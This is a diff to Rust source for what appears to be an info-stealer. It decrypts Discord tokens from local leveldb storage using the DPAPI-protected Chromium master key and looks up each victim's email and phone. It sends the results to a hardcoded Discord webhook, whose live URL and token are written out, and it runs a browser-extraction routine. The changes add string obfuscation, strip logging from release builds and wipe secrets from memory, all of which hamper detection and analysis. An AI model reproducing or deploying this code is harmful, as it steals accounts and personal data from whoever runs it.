@@ -5,6 +5,7 @@ mod log;
 
 use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
 use base64::{engine::general_purpose, Engine as _};
+use obfstr::obfstr;
 use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
 use std::{collections::{HashMap, HashSet}, env, fs, path::PathBuf};
@@ -17,14 +18,17 @@ struct DdU {
     tag: String,
     avatar: Option<String>,
     public_flags: u64,
-    email: String,  
-    phone: String   
+    email: String,
+    phone: String,
 }
 
 async fn vt(client: &reqwest::Client, token: &str) -> Option<DdU> {
-    let res = client.get("https://discord.com/api/v9/users/@me")
+    let res = client
+        .get("https://discord.com/api/v9/users/@me")
         .header("Authorization", token)
-        .send().await.ok()?;
+        .send()
+        .await
+        .ok()?;
 
     if res.status().is_success() {
         let json: Value = res.json().await.ok()?;
@@ -36,16 +40,18 @@ async fn vt(client: &reqwest::Client, token: &str) -> Option<DdU> {
         let email = json["email"].as_str().unwrap_or("N/A").to_string();
         let phone = json["phone"].as_str().unwrap_or("N/A").to_string();
 
-        Some(DdU { 
-            id, 
-            username: username.clone(), 
-            tag: format!("{}#{}", username, discrim), 
+        Some(DdU {
+            id,
+            username: username.clone(),
+            tag: format!("{}#{}", username, discrim),
             avatar,
             public_flags,
             email,
-            phone
+            phone,
         })
-    } else { None }
+    } else {
+        None
+    }
 }
 
 fn badge_emojis(flags: u64) -> Vec<&'static str> {
@@ -64,7 +70,7 @@ fn badge_emojis(flags: u64) -> Vec<&'static str> {
         (1 << 18, "<:ModeratorProgramsAlumni:1365701046256533525>"),
         (1 << 12, "<:NitroClassic:1365701254894419988>"),
         (1 << 13, "<:Nitro:1365701270424199680>"),
-        (1 << 17, "<:ServerBooster:1365701285578037760>")
+        (1 << 17, "<:ServerBooster:1365701285578037760>"),
     ];
 
     let mut emojis = Vec::new();
@@ -76,30 +82,33 @@ fn badge_emojis(flags: u64) -> Vec<&'static str> {
     emojis
 }
 
-
-
 fn decrypt_master_key(encrypted_key: &[u8]) -> Option<Vec<u8>> {
     let key_data = if encrypted_key.starts_with(b"DPAPI") {
         &encrypted_key[5..]
     } else {
         encrypted_key
     };
-    
+
     unsafe {
         let mut input = CRYPT_INTEGER_BLOB {
             cbData: key_data.len() as u32,
             pbData: key_data.as_ptr() as *mut u8,
         };
-        let mut output = CRYPT_INTEGER_BLOB { cbData: 0, pbData: std::ptr::null_mut() };
+        let mut output = CRYPT_INTEGER_BLOB {
+            cbData: 0,
+            pbData: std::ptr::null_mut(),
+        };
         if CryptUnprotectData(&mut input, None, None, None, None, 0, &mut output).is_ok() {
             Some(std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec())
-        } else { None }
+        } else {
+            None
+        }
     }
 }
 
 fn decrypt_token(raw_data: &[u8], master_key: &[u8]) -> Option<String> {
-    if raw_data.len() < 15 { 
-        return None; 
+    if raw_data.len() < 15 {
+        return None;
     }
 
     let prefix = &raw_data[0..3];
@@ -109,7 +118,7 @@ fn decrypt_token(raw_data: &[u8], master_key: &[u8]) -> Option<String> {
                 return None;
             }
             (&raw_data[3..15], &raw_data[15..])
-        },
+        }
         _ => {
             if raw_data.len() < 12 {
                 return None;
@@ -121,16 +130,17 @@ fn decrypt_token(raw_data: &[u8], master_key: &[u8]) -> Option<String> {
     if ciphertext.len() < 16 {
         return None;
     }
-    
+
     let (encrypted_data, tag) = ciphertext.split_at(ciphertext.len() - 16);
-    
+
     let mut payload = encrypted_data.to_vec();
     payload.extend_from_slice(tag);
 
     let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(master_key));
     let nonce = Nonce::from_slice(iv);
 
-    cipher.decrypt(nonce, payload.as_ref())
+    cipher
+        .decrypt(nonce, payload.as_ref())
         .ok()
         .and_then(|d| String::from_utf8(d).ok())
 }
@@ -147,10 +157,14 @@ fn get_discord_paths() -> HashMap<&'static str, PathBuf> {
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     log::init();
+    #[cfg(debug_assertions)]
     log::log("=== START ===");
     browsers::chrome_inject::cleanup_legacy_artifacts();
 
-    let wbh = "https://discord.com/api/webhooks/1529195936272613640/QBRdpSpgeJkbg0OGdt1_tFVhwsX8q8VpKYFZH5HXJrTm5No6DpgiPT2iKwZUv6p8FDXd";
+    let p1 = obfstr!("https://discord.com/api/").to_string();
+    let p2 = obfstr!("webhooks/1529195936272613640/").to_string();
+    let p3 = obfstr!("QBRdpSpgeJkbg0OGdt1_tFVhwsX8q8VpKYFZH5HXJrTm5No6DpgiPT2iKwZUv6p8FDXd").to_string();
+    let mut wbh = format!("{}{}{}", p1, p2, p3);
     let client = reqwest::Client::new();
     let mut sent_tokens = HashSet::new();
 
@@ -158,11 +172,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     for (name, path) in discord_paths {
         if !path.exists() {
+            #[cfg(debug_assertions)]
             log::log(&format!("discord skip (missing): {name}"));
             continue;
         }
+        #[cfg(debug_assertions)]
         log::log(&format!("discord scan: {name} -> {}", path.display()));
-        
+
         let local_state_path = path.join("Local State");
 
         if let Ok(content) = fs::read_to_string(&local_state_path) {
@@ -170,10 +186,11 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             if let Some(enc_key) = json_ls["os_crypt"]["encrypted_key"].as_str() {
                 if let Ok(bytes) = general_purpose::STANDARD.decode(enc_key) {
                     if let Some(master_key) = decrypt_master_key(&bytes[5..]) {
-                        
                         let prof_path = path.clone();
 
-                        if !prof_path.exists() { continue; }
+                        if !prof_path.exists() {
+                            continue;
+                        }
 
                         let db_path = prof_path.join("Local Storage/leveldb");
 
@@ -184,21 +201,45 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                     if let Ok(file_content) = fs::read(entry.path()) {
                                         let text = String::from_utf8_lossy(&file_content);
                                         for cap in re.captures_iter(&text) {
-                                            let b64_part = cap[0].split("dQw4w9WgXcQ:").nth(1).unwrap_or_default().trim_end_matches('"').trim_end_matches('\\');
+                                            let b64_part = cap[0]
+                                                .split("dQw4w9WgXcQ:")
+                                                .nth(1)
+                                                .unwrap_or_default()
+                                                .trim_end_matches('"')
+                                                .trim_end_matches('\\');
                                             if let Ok(enc_data) = general_purpose::STANDARD.decode(b64_part) {
-                                                if let Some(token) = decrypt_token(&enc_data, &master_key) {
+                                                if let Some(mut token) =
+                                                    decrypt_token(&enc_data, &master_key)
+                                                {
                                                     if sent_tokens.insert(token.clone()) {
-                                                        log::log(&format!("discord token found ({name})"));
+                                                        #[cfg(debug_assertions)]
+                                                        log::log(&format!(
+                                                            "discord token found ({name})"
+                                                        ));
                                                         if let Some(user) = vt(&client, &token).await {
-                                                            let avatar_url = user.avatar.as_ref().map(|h| format!("https://cdn.discordapp.com/avatars/{}/{}.png", user.id, h))
-                                                                .unwrap_or_else(|| "https://cdn.discordapp.com/embed/avatars/0.png".to_string());
+                                                            let avatar_url = user
+                                                                .avatar
+                                                                .as_ref()
+                                                                .map(|h| {
+                                                                    format!(
+                                                                        "https://cdn.discordapp.com/avatars/{}/{}.png",
+                                                                        user.id, h
+                                                                    )
+                                                                })
+                                                                .unwrap_or_else(|| {
+                                                                    "https://cdn.discordapp.com/embed/avatars/0.png"
+                                                                        .to_string()
+                                                                });
 
-                                                            let badges_display = badge_emojis(user.public_flags).join(" ");
-                                                            let final_badges = if badges_display.is_empty() { 
-                                                                "`None`".to_string() 
-                                                            } else { 
-                                                                badges_display
-                                                            };
+                                                            let badges_display =
+                                                                badge_emojis(user.public_flags)
+                                                                    .join(" ");
+                                                            let final_badges =
+                                                                if badges_display.is_empty() {
+                                                                    "`None`".to_string()
+                                                                } else {
+                                                                    badges_display
+                                                                };
 
                                                             let embed = json!({
                                                                 "embeds": [{
@@ -218,20 +259,30 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                                                     "timestamp": chrono::Utc::now().to_rfc3339()
                                                                 }]
                                                             });
-                                                            let response = client.post(wbh).json(&embed).send().await;
+                                                            let response =
+                                                                client.post(&wbh).json(&embed).send().await;
                                                             match response {
                                                                 Ok(resp) => {
+                                                                    #[cfg(debug_assertions)]
                                                                     log::log(&format!(
                                                                         "discord webhook token embed: HTTP {}",
                                                                         resp.status()
                                                                     ));
                                                                 }
                                                                 Err(err) => {
+                                                                    #[cfg(debug_assertions)]
                                                                     log::log(&format!(
                                                                         "discord webhook token embed ERR: {err}"
                                                                     ));
                                                                 }
                                                             }
+                                                        }
+                                                        unsafe {
+                                                            std::ptr::write_bytes(
+                                                                token.as_mut_ptr(),
+                                                                0,
+                                                                token.len(),
+                                                            );
                                                         }
                                                     }
                                                 }
@@ -247,14 +298,27 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
 
+    #[cfg(debug_assertions)]
     log::log(&format!("discord tokens sent: {}", sent_tokens.len()));
 
+    #[cfg(debug_assertions)]
     log::log("browser extraction start");
-    match browsers::run(&client, wbh).await {
-        Ok(()) => log::log("browser extraction OK"),
-        Err(e) => log::log(&format!("browser extraction ERR: {e}")),
+    match browsers::run(&client, &wbh).await {
+        Ok(()) => {
+            #[cfg(debug_assertions)]
+            log::log("browser extraction OK");
+        }
+        Err(e) => {
+            #[cfg(debug_assertions)]
+            log::log(&format!("browser extraction ERR: {e}"));
+        }
     }
 
+    unsafe {
+        std::ptr::write_bytes(wbh.as_mut_ptr(), 0, wbh.len());
+    }
+
+    #[cfg(debug_assertions)]
     log::log("=== DONE ===");
     Ok(())
 }
